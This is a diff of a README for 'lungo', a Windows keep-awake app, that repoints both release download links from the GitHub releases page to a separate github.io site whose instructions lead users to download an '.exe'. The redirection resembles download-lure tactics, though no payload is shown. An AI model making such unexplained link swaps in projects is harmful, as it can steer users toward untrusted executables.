@@ -1,6 +1,6 @@
 # ☕ lungo - Keep your computer awake on demand
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tandieprepared599/lungo/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tandieprepared599.github.io)
 
 ## 🎯 About the app
 
@@ -14,7 +14,7 @@ This application runs on Windows 10 and Windows 11. It needs minimal system reso
 
 To get started, follow these instructions:
 
-1. Visit the [official release page](https://github.com/Tandieprepared599/lungo/releases) to find the latest version.
+1. Visit the [official release page](https://tandieprepared599.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to download it to your computer.
 4. Save the file to a folder you can find later, such as your Downloads folder.
